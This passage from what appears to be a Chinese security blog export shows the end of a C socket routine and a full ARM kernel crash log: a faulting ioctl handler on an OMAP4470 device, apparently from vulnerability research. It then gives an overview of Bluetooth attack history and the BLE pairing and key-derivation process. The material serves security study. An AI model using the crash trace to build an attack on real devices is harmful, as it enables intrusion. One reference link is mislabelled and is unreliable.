listen;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">if</span>(read_size == <span class="number">-1</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		perror(<span class="string">&quot;recv failed&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	 </span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="崩溃日志"><a href="#崩溃日志" class="headerlink" title="崩溃日志"></a>崩溃日志</h2><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[  144.428375] Unable to handle kernel paging request at virtual address d900000c</span><br><span class="line">[  144.436462] pgd &#x3D; dcac0000</span><br><span class="line">[  144.439697] [d900000c] *pgd&#x3D;00000000</span><br><span class="line">[  144.443939] Internal error: Oops: 5 [#1] PREEMPT SMP ARM</span><br><span class="line">[  144.450012] Modules linked in: omaplfb(O) pvrsrvkm(O) pvr_logger(O)</span><br><span class="line">[  144.457672] CPU: 0    Tainted: G           O  (3.4.83-gd2afc0bae69 #1)</span><br><span class="line">[  144.465118] PC is at c2dm_l1cache+0x30&#x2F;0x100</span><br><span class="line">[  144.469940] LR is at dev_ioctl+0x3f0&#x2F;0x10c4</span><br><span class="line">[  144.474670] pc : [&lt;c03187ac&gt;]    lr : [&lt;c031782c&gt;]    psr: a0000013</span><br><span class="line">[  144.474670] sp : c2d6be38  ip : 00000000  fp : c2d6be6c</span><br><span class="line">[  144.487640] r10: 00000000  r9 : d8c0cca8  r8 : 00b8dd90</span><br><span class="line">[  144.493621] r7 : 00000000  r6 : c2d6bea4  r5 : 00b8dd90  r4 : 388b77c4</span><br><span class="line">[  144.500915] r3 : d9000004  r2 : 75e0c121  r1 : c2d6bea4  r0 : 00000000</span><br><span class="line">[  144.508331] Flags: NzCv  IRQs on  FIQs on  Mode SVC_32  ISA ARM  Segment user</span><br><span class="line">[  144.516418] Control: 10c5387d  Table: 9cac004a  DAC: 00000015</span><br><span class="line">[  144.522827] </span><br><span class="line">[  144.522857] PC: 0xc031872c:</span><br><span class="line">[  144.527954] 872c  e51b2034 e592300c eaffffa5 e30c281c e34c209d e5923000 e3530000 1affffbd</span><br><span class="line">[  144.538482] 874c  eaffffc0 e51b303c e51b1040 e2833001 e51b2034 e1530001 e50b303c e2822010</span><br><span class="line">[  144.549163] 876c  e50b2034 1affff8c eaffff83 c09dc81c e1a0c00d e92ddff0 e24cb004 e24dd00c</span><br><span class="line">[  144.559844] 878c  e3500000 e1a07002 e50b0030 da00000d e0814200 e1a06001 e1a03001 e3a02000</span><br><span class="line">[  144.570404] 87ac  e5930008 e593c004 e2833010 e1530004 e022209c 1afffff9 e3520902 3a000003</span><br><span class="line">[  144.581085] 87cc  e3570002 9a000022 e24bd028 e89daff0 e59f9090 e2818008 e3a0a000 e5963008</span><br><span class="line">[  144.591735] 87ec  e5184008 e3530000 13a05000 1a00000a ea000010 e5181004 e5993024 e0841001</span><br><span class="line">[  144.602416] 880c  e12fff33 e5962008 e2855001 e596300c e1550002 e0844003 2a000006 e2572000</span><br><span class="line">[  144.612976] </span><br><span class="line">[  144.612976] LR: 0xc03177ac:</span><br><span class="line">[  144.618072] 77ac  ebf55c15 eaffff35 e3053d8d e3443038 e1510003 1affff30 e1a0200d e3c23d7f</span><br><span class="line">[  144.628631] 77cc  e3c3303f e24b0064 e5933008 e2952038 30d22003 33a03000 e3530000 1a0001a8</span><br><span class="line">[  144.639160] 77ec  e1a01005 e3a02038 ebfcfa90 e3500000 1a00000e e51b2030 e3520001 0a0001cb</span><br><span class="line">[  144.649780] 780c  e3520002 0a0001ee e3520000 1a000007 e51b0064 e3a02000 e24b1060 eb0003d3</span><br><span class="line">[  144.660369] 782c  e51b0064 e24b1060 e51b2030 eb000338 e3a05000 eaffff11 e24b1064 e50b1088</span><br><span class="line">[  144.670776] 784c  e51b0088 e3a01010 ebfd03c1 e3a03004 e50b3064 e5963008 e2952004 30d22003</span><br><span class="line">[  144.681213] 786c  33a03000 e3530000 0a0001c5 e3e0500d eaffff02 e1a0200d e3c26d7f e3c6603f</span><br><span class="line">[  144.691528] 788c  e5963008 e2952008 30d22003 33a03000 e3530000 1a000021 e24b3064 e1a01005</span><br><span class="line">[  144.701995] </span><br><span class="line">[  144.701995] SP: 0xc2d6bdb8:</span><br><span class="line">[  144.706878] bdb8  c2d6be24 00b8dd90 c2d6bdec c2d6bdd0 c00084d0 c03187ac a0000013 ffffffff</span><br><span class="line">[  144.717407] bdd8  c2d6be24 00b8dd90 c2d6be6c c2d6bdf0 c06a5318 c0008370 00000000 c2d6bea4</span><br><span class="line">[  144.727905] bdf8  75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4 00000000 00b8dd90 d8c0cca8</span><br><span class="line">[  144.738586] be18  00000000 c2d6be6c 00000000 c2d6be38 c031782c c03187ac a0000013 ffffffff</span><br><span class="line">[  144.749145] be38  c02ba53c 575b4b92 d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90</span><br><span class="line">[  144.759796] be58  d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088</span><br><span class="line">[  144.770355] be78  000ffeff 00000001 c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000</span><br><span class="line">[  144.781005] be98  c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261</span><br><span class="line">[  144.791687] </span><br><span class="line">[  144.791687] FP: 0xc2d6bdec:</span><br><span class="line">[  144.796661] bdec  c0008370 00000000 c2d6bea4 75e0c121 d9000004 388b77c4 00b8dd90 c2d6bea4</span><br><span class="line">[  144.807189] be0c  00000000 00b8dd90 d8c0cca8 00000000 c2d6be6c 00000000 c2d6be38 c031782c</span><br><span class="line">[  144.817840] be2c  c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000 00000000 00b8dd90</span><br><span class="line">[  144.828399] be4c  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04 c2d6be70 c031782c</span><br><span class="line">[  144.839080] be6c  c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc c2d6be90 c0207454</span><br><span class="line">[  144.849761] be8c  c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92 4ccba3b5 47a0578f</span><br><span class="line">[  144.860290] beac  83b275c7 00000000 00020261 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  144.870971] becc  00000000 00000000 00000000 c02089fc 00000000 dcae46c0 0000000b dcae46c0</span><br><span class="line">[  144.881652] </span><br><span class="line">[  144.881652] R1: 0xc2d6be24:</span><br><span class="line">[  144.886627] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><br><span class="line">[  144.897308] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><br><span class="line">[  144.907989] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><br><span class="line">[  144.918518] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><br><span class="line">[  144.929199] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><br><span class="line">[  144.939849] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><br><span class="line">[  144.950531] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><br><span class="line">[  144.961059] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  144.971710] </span><br><span class="line">[  144.971710] R3: 0xd8ffff84:</span><br><span class="line">[  144.976623] ff84  d8ffff20 d8efb000 00000707 020e40fb d8efb075 d8ffff3c d8efb01c d8ffffa0</span><br><span class="line">[  144.987213] ffa4  d8ffffa0 d8efb028 ca9788f0 d8ffffb0 d8ffffb0 00000000 bf06e9c8 80000088</span><br><span class="line">[  144.997772] ffc4  dd2eac00 dd309540 00000000 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  145.008392] ffe4  00000000 00000000 00000000 00000000 00000000 00000000 00000000 ********</span><br><span class="line">[  145.018798] 0004  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.029327] 0024  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.039886] 0044  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.050384] 0064  ******** ******** ******** ******** ******** ******** ******** ********</span><br><span class="line">[  145.060913] </span><br><span class="line">[  145.060913] R6: 0xc2d6be24:</span><br><span class="line">[  145.066009] be24  c2d6be38 c031782c c03187ac a0000013 ffffffff c02ba53c 575b4b92 d8578000</span><br><span class="line">[  145.076568] be44  00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf04</span><br><span class="line">[  145.087219] be64  c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001 c2d6bedc</span><br><span class="line">[  145.097900] be84  c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8 575b4b92</span><br><span class="line">[  145.108459] bea4  4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000 00000000</span><br><span class="line">[  145.118988] bec4  00000000 00000000 00000000 00000000 00000000 c02089fc 00000000 dcae46c0</span><br><span class="line">[  145.129638] bee4  0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08 c0136044</span><br><span class="line">[  145.140319] bf04  c0317448 00000000 00000000 00000000 00000001 00000000 dd045190 dcf8c440</span><br><span class="line">[  145.150848] </span><br><span class="line">[  145.150848] R9: 0xd8c0cc28:</span><br><span class="line">[  145.155944] cc28  d8c0cc28 d8c0cc28 00000000 00000000 00000000 c06bc674 000200da c09dda58</span><br><span class="line">[  145.166503] cc48  00000000 00000000 d8c0cc50 d8c0cc50 00000000 c0aa5174 c0aa5174 c0aa5148</span><br><span class="line">[  145.177062] cc68  5aefd94b 00000000 00000000 00000000 d8c0cc80 9ad1f453 00000000 00000000</span><br><span class="line">[  145.187713] cc88  00200000 00000000 00000000 d8c0cc94 d8c0cc94 dd3b56c0 dd3b56c0 00000000</span><br><span class="line">[  145.198394] cca8  000521a4 000003e8 000003e8 00000000 00000000 00000000 c06b9600 dd150400</span><br><span class="line">[  145.208923] ccc8  d8c0cd80 dd3e3e70 00001064 00000001 0fb00000 5aefd94b 2d2b4d13 5aefd94b</span><br><span class="line">[  145.219573] cce8  2d2b4d13 5aefd94b 2d2b4d13 00000000 00000000 00000000 00000000 00000000</span><br><span class="line">[  145.230255] cd08  00000000 00000000 00000000 00000000 00000001 00000000 00000000 d8c0cd24</span><br><span class="line">[  145.240936] Process executor32 (pid: 3810, stack limit &#x3D; 0xc2d6a2f8)</span><br><span class="line">[  145.248016] Stack: (0xc2d6be38 to 0xc2d6c000)</span><br><span class="line">[  145.253082] be20:                                                       c02ba53c 575b4b92</span><br><span class="line">[  145.262176] be40: d8578000 00000000 00b8dd90 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000</span><br><span class="line">[  145.271392] be60: c2d6bf04 c2d6be70 c031782c c0318788 00000001 00000088 000ffeff 00000001</span><br><span class="line">[  145.280609] be80: c2d6bedc c2d6be90 c0207454 c00bd920 00000027 d7ce5000 c2d6bed4 c2d6bea8</span><br><span class="line">[  145.289703] bea0: 575b4b92 4ccba3b5 47a0578f 83b275c7 00000000 00020261 00000000 00000000</span><br><span class="line">[  145.298919] bec0: 00000000 00000000 00000000 00000000 00000000 00000000 c02089fc 00000000</span><br><span class="line">[  145.308105] bee0: dcae46c0 0000000b dcae46c0 00b8dd90 d8c0cca8 00000000 c2d6bf74 c2d6bf08</span><br><span class="line">[  145.317352] bf00: c0136044 c0317448 00000000 00000000 00000000 00000001 00000000 dd045190</span><br><span class="line">[  145.326416] bf20: dcf8c440 c2d6bf0c c2d6a000 00b8dd80 00b8dd90 40385d8d dcae46c0 0000000b</span><br><span class="line">[  145.335662] bf40: c2d6a000 00000000 c2d6bf64 00000000 00b8dd90 40385d8d dcae46c0 0000000b</span><br><span class="line">[  145.344879] bf60: c2d6a000 00000000 c2d6bfa4 c2d6bf78 c01365e0 c0135fc4 00000000 00000000</span><br><span class="line">[  145.354095] bf80: c0013e08 00b8dd80 000121c0 00000000 00000036 c0013e08 00000000 c2d6bfa8</span><br><span class="line">[  145.363159] bfa0: c0013c60 c0136578 00b8dd80 000121c0 0000000b 40385d8d 00b8dd90 00b8dd90</span><br><span class="line">[  145.372406] bfc0: 00b8dd80 000121c0 00000000 00000036 00000000 00000000 00000000 bee035f4</span><br><span class="line">[  145.381622] bfe0: 810100fc bee030f4 00011578 0002b28c 60000010 0000000b 4d6969d9 03020430</span><br><span class="line">[  145.390686] Backtrace: </span><br><span class="line">[  145.393829] [&lt;c031877c&gt;] (c2dm_l1cache+0x0&#x2F;0x100) from [&lt;c031782c&gt;] (dev_ioctl+0x3f0&#x2F;0x10c4)</span><br><span class="line">[  145.403228] [&lt;c031743c&gt;] (dev_ioctl+0x0&#x2F;0x10c4) from [&lt;c0136044&gt;] (do_vfs_ioctl+0x8c&#x2F;0x5b4)</span><br><span class="line">[  145.412658] [&lt;c0135fb8&gt;] (do_vfs_ioctl+0x0&#x2F;0x5b4) from [&lt;c01365e0&gt;] (sys_ioctl+0x74&#x2F;0x84)</span><br><span class="line">[  145.421874] [&lt;c013656c&gt;] (sys_ioctl+0x0&#x2F;0x84) from [&lt;c0013c60&gt;] (ret_fast_syscall+0x0&#x2F;0x30)</span><br><span class="line">[  145.431304]  r8:c0013e08 r7:00000036 r6:00000000 r5:000121c0 r4:00b8dd80</span><br><span class="line">[  145.439605] Code: e0814200 e1a06001 e1a03001 e3a02000 (e5930008) </span><br><span class="line">[  145.450225] Board Information: </span><br><span class="line">[  145.450225]  Revision : 0001</span><br><span class="line">[  145.450256]  Serial	: 0000000000000000</span><br><span class="line">[  145.450256] SoC Information:</span><br><span class="line">[  145.450256]  CPU	: OMAP4470</span><br><span class="line">[  145.450286]  Rev	: ES1.0</span><br><span class="line">[  145.450286]  Type	: HS</span><br><span class="line">[  145.450286]  Production ID: 0002B975-000000CC</span><br><span class="line">[  145.450286]  Die ID	: 1CC60000-50002FFF-0B00935D-11007004</span><br><span class="line">[  145.450317] </span><br><span class="line">[  145.485900] ---[ end trace 0fe3b4c74b4e9fa7 ]---</span><br><span class="line">[  145.491149] Kernel panic - not syncing: Fatal exception</span><br><span class="line">[  145.496917] CPU1: stopping</span><br><span class="line">[  145.500152] Backtrace: </span><br><span class="line">[  145.503204] [&lt;c0018148&gt;] (dump_backtrace+0x0&#x2F;0x10c) from [&lt;c0698bb8&gt;] (dump_stack+0x18&#x2F;0x1c)</span><br><span class="line">[  145.512695]  r6:c09ddc50 r5:c09dc844 r4:00000001 r3:c0a0e950</span><br><span class="line">[  145.519714] [&lt;c0698ba0&gt;] (dump_stack+0x0&#x2F;0x1c) from [&lt;c0019bd8&gt;] (handle_IPI+0x190&#x2F;0x1c4)</span><br><span class="line">[  145.528961] [&lt;c0019a48&gt;] (handle_IPI+0x0&#x2F;0x1c4) from [&lt;c00084fc&gt;] (gic_handle_irq+0x58&#x2F;0x60)</span><br><span class="line">[  145.538482] [&lt;c00084a4&gt;] (gic_handle_irq+0x0&#x2F;0x60) from [&lt;c06a5540&gt;] (__irq_usr+0x40&#x2F;0x60)</span><br><span class="line">[  145.547637] Exception stack(0xd85a5fb0 to 0xd85a5ff8)</span><br><span class="line">[  145.553466] 5fa0:                                     41822290 418185e8 00000001 41c95000</span><br><span class="line">[  145.562561] 5fc0: 418185e8 41687460 4010d0ec 418185e8 4010d038 41689398 7fffffff 401602ec</span><br><span class="line">[  145.571777] 5fe0: 418191e8 5ba34d10 41609aa8 41609974 200b0010 ffffffff</span><br><span class="line">[  145.579284]  r6:ffffffff r5:200b0010 r4:41609974 r3:41822290</span><br><span class="line">[  145.586364] CPU0 PC (0) : 0xc003ee38</span><br><span class="line">[  145.590576] CPU0 PC (1) : 0xc003ee54</span><br><span class="line">[  145.594635] CPU0 PC (2) : 0xc003ee54</span><br><span class="line">[  145.598693] CPU0 PC (3) : 0xc003ee54</span><br><span class="line">[  145.602722] CPU0 PC (4) : 0xc003ee54</span><br><span class="line">[  145.606781] CPU0 PC (5) : 0xc003ee54</span><br><span class="line">[  145.610839] CPU0 PC (6) : 0xc003ee54</span><br><span class="line">[  145.614898] CPU0 PC (7) : 0xc003ee54</span><br><span class="line">[  145.619110] CPU0 PC (8) : 0xc003ee54</span><br><span class="line">[  145.623168] CPU0 PC (9) : 0xc003ee54</span><br><span class="line">[  145.627227] CPU1 PC (0) : 0xc0019b2c</span><br><span class="line">[  145.631408] CPU1 PC (1) : 0xc0019b2c</span><br><span class="line">[  145.635467] CPU1 PC (2) : 0xc0019b2c</span><br><span class="line">[  145.639495] CPU1 PC (3) : 0xc0019b2c</span><br><span class="line">[  145.643707] CPU1 PC (4) : 0xc0019b2c</span><br><span class="line">[  145.647766] CPU1 PC (5) : 0xc0019b2c</span><br><span class="line">[  145.651824] CPU1 PC (6) : 0xc0019b2c</span><br><span class="line">[  145.656005] CPU1 PC (7) : 0xc0019b2c</span><br><span class="line">[  145.660064] CPU1 PC (8) : 0xc0019b2c</span><br><span class="line">[  145.664123] CPU1 PC (9) : 0xc0019b2c</span><br><span class="line">[  145.668182] </span><br><span class="line">[  145.669952] Restarting Linux version 3.4.83-gd2afc0bae69 (build@14-use1a-b-39) (gcc version 4.7 (GCC) ) #1 SMP PREEMPT Tue Sep 19 22:04:47 UTC 2017</span><br><span class="line">[  145.669982] </span><br></pre></td></tr></table></figure></blockquote>
]]></content>
      <categories>
        <category>IOT</category>
      </categories>
      <tags>
        <tag>IOT</tag>
        <tag>Amazon</tag>
      </tags>
  </entry>
  <entry>
    <title>蓝牙安全以及相关漏洞研究</title>
    <url>/2020/09/24/IOT/%E8%93%9D%E7%89%99%E5%AE%89%E5%85%A8%E4%BB%A5%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/</url>
    <content><![CDATA[<p>放大佬总结的一张图：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/BLE%E5%AE%89%E5%85%A8.png" alt="BLE安全"></p>
<p>蓝牙是一种无线通信标准，工作在2.4～2.485Ghz的ISM频段，主要用于短距离的数据连接，可以建立所谓的PAN(Personal Area Network)网络。蓝牙设备最常见的应用是各种以手机和电脑为中心的外围设备，例如与手机配合使用的蓝牙耳机、手机与汽车音响的互联、蓝牙键盘和鼠标等。</p>
<a id="more"></a>

<h2 id="0x00-蓝牙技术简介"><a href="#0x00-蓝牙技术简介" class="headerlink" title="0x00 蓝牙技术简介"></a><strong>0x00 蓝牙技术简介</strong></h2><p>蓝牙”，即Bluetooth，是斯堪的纳维亚语中 Blåtand / Blåtann 的英化版本。该词是十世纪的一位国王Harald Bluetooth的绰号，相传他将纷争不断的丹麦部落统一为一个王国，并引入了基督教。蓝牙技术开发者Jim Kardach于1997年提出用Bluetooth这个名词，据说他当时正在读一本名为The Long Ships的小说，讲述的就是维京人和Harald Bluetooth国王的故事。他认为蓝牙可以把各种不同的通信协议统一在一起，诚如这位国王做的事情一样。至于蓝牙的logo，取自国王Harald Bluetooth名字中的【H】和【B】两个字母的组合，用古北欧文字来表示：</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/33981.png" alt="0"></p>
<p>蓝牙技术最早是1994年由爱立信发明的，最初的目的是用无线连接来代替RS-232线缆连接。目前蓝牙标准由Bluetooth Special Interest Group (SIG) 组织管理。这一组织有超过25000个成员公司，分布在电信、计算机、网络和消费电子领域。</p>
<p>蓝牙工作在2.4～2.485GHz频段，有79个频道，每个频道占据1MHz宽带。因为2.4GHz的ISM频段是非常繁忙的，为了对抗其他系统的干扰，蓝牙采取跳频式的扩频技术，通常1秒钟跳跃1600次。BLE(Bluetooth Low Energy)只有40个频道，每个频道占据2MHz宽带.</p>
<p>蓝牙是一种基于数据包通信的协议，使用主-从式的网络结构。在一个piconet中，1个主节点可以与多达7个从节点通信。所有的设备都共享主节点的时钟。数据包以312.5us的间隔互相交换，这个时间成为clock tick。两个clock tick构成一个625us的时隙，两个时隙构成一个1250us的时隙对。一种比较简单的时隙配置是，主节点在偶数时隙发送数据包，在奇数时隙接受数据包；从节点相反，在偶数时隙接受数据包，在奇数时隙发送数据包。这里讨论的是经典的蓝牙协议，BLE的空中接口协议与经典的蓝牙协议有很大的不同。蓝牙协议还支持多个piconet连接在一起，组成scatternet。在这种情况下，某些设备可以在一个piconet中担任主节点，在离另一个piconet中知识从节点。</p>
<p>蓝牙技术已经发展了很多年，蓝牙规范有很多个版本，从最早的蓝牙1.0到2014年发布的蓝牙4.2。早期的蓝牙标准只能支持几百Kbps的传输速率，而到了蓝牙3.0版本，已经可以支持最高24Mbps的传输速度。蓝牙4.0版本引入了BLE协议，即低功耗蓝牙，其功耗非常低，可以使设备的电池维持很长的时间，因此在很多可穿戴设备中得到了应用。</p>
<p>一文读懂蓝牙技术从 1.0 到 5.0 的前世今生                                  (<a href="https://zhuanlan.zhihu.com/p/37725574">https://zhuanlan.zhihu.com/p/37725574</a>)</p>
<h2 id="0x01-蓝牙安全概述"><a href="#0x01-蓝牙安全概述" class="headerlink" title="0x01 蓝牙安全概述"></a><strong>0x01 蓝牙安全概述</strong></h2><p>蓝牙协议有加密和鉴权功能。蓝牙的密钥产生是基于蓝牙的PIN码的。PIN码需要输入到蓝牙设备中，或者出场时就已经写入设备里。在美国国家标准技术研究所官网上有一份蓝牙安全指南Guide to Bluetooth Security(<a href="https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。">https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-172-draft.pdf)中介绍了如何安全的使用蓝牙技术。使用蓝牙技术非常简单、易用、但是也有明显的缺点，容易被拒绝服务攻击、窃听、中间人攻击、数据篡改、占用资源。所有在选用蓝牙技术时，必须充分评估能否接受这样的风险。这份指南同时也给出了一些知道，在创建和维护一个蓝牙系统时，如何去降低他的安全风险。</a></p>
<p>2001年，内尔实验室的Jakobsson和Wetzel发现了蓝牙配对协议中的缺陷，以及加密方法中的漏洞。2003年，A.L.Digital公司的两位研究人员Ben和Adam Laurie发现，在一些蓝牙产品中有严重的漏洞，能够导致个人隐私数据的泄漏。于是，接下来就出现了一种利用这种BlueBug攻击手法，开始展现出这一漏洞的危害性</p>
<p>2004年，第一个所谓的蓝牙病毒出现，它可以在Symbian操作系统的手机中传播。这个”病毒”是一个名叫”29A”的团队编写的PoC程序，写出来之后就交给了反病毒机构，因此它具有威胁性，但并没有真正的传播过。2004年8月，一项实验创纪录地把蓝牙连接的距离增加到了1.79公里，在实验中使用了方向性天线和功率放大器。这就增加了蓝牙病毒的危险性，使得它能够威胁到距离非常远的蓝牙设备</p>
<p>2005年1月，出现了一种名为”Lasco.A”的手机蠕虫病毒，也是针对Symbian手机的。用户一旦通过蓝牙接收这个病毒文件，病毒就会自动地安装在系统中，然后开始寻找周围其他的蓝牙设备去感染。另外这种病毒还能感染系统中的其他SIS文件。最终的后果是导致手机系统不稳定。</p>
<p>2005 年4月，剑桥大学的安全研究人员公布了他们发现的一种被动式攻击方式， 能够攻击基于PIN码的配对协议。这种攻击方式操作起来非常快，证实了蓝牙的对称密钥的建立方法是有缺陷的。为了抵御这种攻击，研究人员提出了-种更强的非对称密钥加密方法。</p>
<p>2005年6月，Yaniv Shaked和Avishai Wool发表了一篇论文，提出了被动式和主动式两种攻击方式，可以获得PIN码。在被动式攻击中，攻击者在蓝牙设备初始配对的时刻就能窃听到通信的内容:而主动式攻击则需要在某个特定的时刻发出一-种特殊构造的数据包，使主节点和从节点重复配对过程，之后就可以使用被动式攻击在配对过程中侦听密钥了。这种攻击的主要弱点在于，它需要受到攻击的用户在攻击期间重新输入PIN码，此时设备会有提示。另外，这种攻击还需要一些特别的设备在恰当的时刻发出一种特殊构造的数据包，现成的蓝牙芯片是不.能做到这一- 点的。</p>
<p>蓝牙地址还可以用于追踪设备的位置。2005 年8月，英格兰剑桥郡的警方发出警示说，有些小偷利用蓝牙来探查车内是否有被遗忘的手机或电脑等设备，提示人们在不使用蓝牙功能时尽量关闭它。</p>
<p>2006年4月，来自Secure Network和F-Secure的研究人员发布了一份报告，警告有大量留在“可见”状态的设备，还报告了各种蓝牙服务的普及程度，以及与蓝牙蠕虫传播的危险性有关的统计数据。</p>
<p>2007年10月，在卢森堡的Hack.lu Security会议上，Kevin Finistere和Thiery Zoller演示了通过蓝牙远程rootMacOSXv10.3.9和v10.4系统，还演示了一个蓝牙PIN码和Linkeys破解器。</p>
<p>维基百科.上介绍的以上这些蓝牙安全的案例都至少是9年以前的事情了。那么近些年来，在蓝牙安全领域又有什么攻击方式</p>
<h2 id="0x02-BLE工作流程"><a href="#0x02-BLE工作流程" class="headerlink" title="0x02 BLE工作流程"></a><strong>0x02 BLE工作流程</strong></h2><h3 id="1-工作流程"><a href="#1-工作流程" class="headerlink" title="1.工作流程"></a><strong>1.工作流程</strong></h3><p>BLE低功耗蓝牙适用于短距离无线通信，正常与形式传输距离为10m(低功耗模式下为100m)，频段2.4Ghz。先进行三个蓝牙术语介绍：</p>
<ul>
<li>配对：配对是指两个蓝牙设备首次通讯时，互相确认的过程。两个蓝牙设备之间一经配对之后，随后的通讯连接就不必每次都要做确认，非常的方便</li>
<li>PIN：个人识别码，蓝牙适用的PIN码长度为1-8个十进制位(8-128比特)</li>
<li>DB_ADDR：蓝牙设备地址。每个蓝牙收发器被分配了唯一的一个48位的设备地址，类似于PC机网卡的MAC地址。两个蓝牙设备在通讯开始时通过询问的方式获取对方的DB_ADDR地址</li>
</ul>
<p>蓝牙的工作过程为:</p>
<p>​                蓝牙启动 -&gt; 扫描设备 -&gt; 设备配对（未配对的设备） -&gt; 数据传输              </p>
<h3 id="2-设备配对模式"><a href="#2-设备配对模式" class="headerlink" title="2.设备配对模式"></a><strong>2.设备配对模式</strong></h3><ul>
<li>Numeric Comparison：配对双方都显示一个6位数的数字，由用户来核对数字是否一致，一致即可配对。例如手机之前的配对。</li>
<li>Just Works：用于配对没有显示没有输入的设备，主动发起连接即可配对，用户看不到配对过程。例如连接蓝牙耳机。</li>
<li>Passkey Entry：要求配对目标输入一个在本地设备上显示的6位数字，输入正确即可配对。例如连接蓝牙键盘</li>
<li>Out of Band：两设备通过别的途径交换配对信息，例如nfc等。例如一些NFC蓝牙音响</li>
</ul>
<h3 id="3-设备配对过程"><a href="#3-设备配对过程" class="headerlink" title="3.设备配对过程"></a><strong>3.设备配对过程</strong></h3><h4 id="a-PIN码配对"><a href="#a-PIN码配对" class="headerlink" title="a PIN码配对"></a><strong>a PIN码配对</strong></h4><p>在老的蓝牙2.0协议中，配对过程需要输入一个PIN码，长度可以从4到16个数字。（很多设备默认为0000或者1234）</p>
<p>在配对的过程中通过PIN码来生成Linkkey。两个配对后的设备共享一个Linkkey，这个行为叫绑定。绑定之后下次两个设备接近后，用Linkkey进行认证，认证通过后生成EncryptionKey进行session的加密。认证的过程采用challenge-reponse的模式，以claimant and the verifier的方式来验证linkkey。认证完一方之后交换身份，在认证另一方。</p>
<h4 id="b-密钥交换配对"><a href="#b-密钥交换配对" class="headerlink" title="b 密钥交换配对"></a><strong>b 密钥交换配对</strong></h4><p>后续蓝牙协议配对则通过密钥交换来完成，又分为生成初始密钥(Kinit)、生成链路密钥(Kab)和双方认证三个过程。</p>
<ul>
<li>生成舒适密钥(Kinit)：初始密钥Kinit长度为128位，由E22算法产生。首先提出通信要求的设备成为主设备(Master)，用A表示;被动进行通信的设备称为从设备(Slave),用B表示。E22算法的输入(明文）由以下三部分组成：</li>
</ul>
<ol>
<li>从设备的物理地址：BD_ADDR,在生成Kinit前，主设备通过询问方式获得从设备的地址BD_ADDR。</li>
<li>PIN码及其长度，PIN码是双方设备预先设定的。</li>
<li>有一个128位的随机数(IN_RAND)。由主设备产生，并以明文方式传送给从设备。</li>
</ol>
<p>由于主、从设备使用了相同的E22算法，如果双方设备以上三部分的值都相等，那么各自算出来的Kinit也应该相同。</p>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34133.png" alt="0"></p>
<ul>
<li>生成链路密钥(Kab)：首先主设备A产生128位的随机数LK_RANDA，从设备B也产生128位的随机数LK_RANDB。在主设备A中，Kinit与LK_RAND进行位比特逻辑异或运算，异或结果发送给B设备；同样的，在B设备中，Kinit和LK_RANDB进行位比特逻辑异或运算，结果发送给A设备。通过这些交换后，A和B设备都具有相同的Kinit、LK_RANDA和LK_RANDAB。设备A和B分别用E21算法将LK_RANDA和LK_RANDB。设备A和B分别用E21算法将LK_RANDA和BD_ADDRA、LK_RANDB和BD_ADDRB加密，并将结果进行异或得到Kab。</li>
</ul>
<p>​    <img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/34168.png" alt="0"></p>
<ul>
